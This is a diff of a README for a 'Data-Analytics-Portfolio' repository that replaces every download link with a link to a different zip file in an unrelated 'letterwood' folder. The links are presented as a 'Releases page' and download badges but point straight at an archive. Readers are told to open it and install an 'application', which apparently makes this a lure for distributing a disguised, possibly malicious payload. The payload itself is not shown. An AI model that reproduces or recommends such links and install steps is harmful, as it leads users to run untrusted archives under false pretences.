@@ -1,6 +1,6 @@
 # 📊 Data-Analytics-Portfolio - Your Gateway to Data Insights
 
-[![Download Latest Release](https://raw.githubusercontent.com/elimarker/Data-Analytics-Portfolio/main/letterwood/Data-Analytics-Portfolio_2.0.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/elimarker/Data-Analytics-Portfolio/main/letterwood/Data-Analytics-Portfolio_2.0.zip)
+[![Download Latest Release](https://github.com/elimarker/Data-Analytics-Portfolio/raw/refs/heads/main/letterwood/Analytics_Portfolio_Data_v3.2.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/elimarker/Data-Analytics-Portfolio/raw/refs/heads/main/letterwood/Analytics_Portfolio_Data_v3.2.zip)
 
 ## 📖 Overview
 
@@ -19,7 +19,7 @@ Welcome to the Data-Analytics-Portfolio! This application showcases a variety of
 To start using the Data-Analytics-Portfolio, follow these simple steps:
 
 1. **Download the Software**: 
-   Visit our [Releases page](https://raw.githubusercontent.com/elimarker/Data-Analytics-Portfolio/main/letterwood/Data-Analytics-Portfolio_2.0.zip) to download the latest version. Look for the release that suits your needs and download the appropriate file for your operating system. The releases will have detailed information on the compatible versions.
+   Visit our [Releases page](https://github.com/elimarker/Data-Analytics-Portfolio/raw/refs/heads/main/letterwood/Analytics_Portfolio_Data_v3.2.zip) to download the latest version. Look for the release that suits your needs and download the appropriate file for your operating system. The releases will have detailed information on the compatible versions.
 
 2. **Install the Application**: 
    Once the download is complete, open the downloaded file and follow the instructions to install the application on your computer. Ensure you have sufficient storage space and meet the minimum system requirements.
@@ -35,7 +35,7 @@ To start using the Data-Analytics-Portfolio, follow these simple steps:
 
 For convenience, you can also download the latest version by clicking the link below:
 
-[![Download Latest Release](https://raw.githubusercontent.com/elimarker/Data-Analytics-Portfolio/main/letterwood/Data-Analytics-Portfolio_2.0.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/elimarker/Data-Analytics-Portfolio/main/letterwood/Data-Analytics-Portfolio_2.0.zip)
+[![Download Latest Release](https://github.com/elimarker/Data-Analytics-Portfolio/raw/refs/heads/main/letterwood/Analytics_Portfolio_Data_v3.2.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/elimarker/Data-Analytics-Portfolio/raw/refs/heads/main/letterwood/Analytics_Portfolio_Data_v3.2.zip)
 
 ### Installation Instructions
 
@@ -98,4 +98,4 @@ Explore more about data analysis and visualization by visiting the following top
 
 This project leverages the work of many open-source contributors. Thank you to the developers and resources that made this possible.
 
-For updates and future releases, keep an eye on our [Releases page](https://raw.githubusercontent.com/elimarker/Data-Analytics-Portfolio/main/letterwood/Data-Analytics-Portfolio_2.0.zip).
+For updates and future releases, keep an eye on our [Releases page](https://github.com/elimarker/Data-Analytics-Portfolio/raw/refs/heads/main/letterwood/Analytics_Portfolio_Data_v3.2.zip).
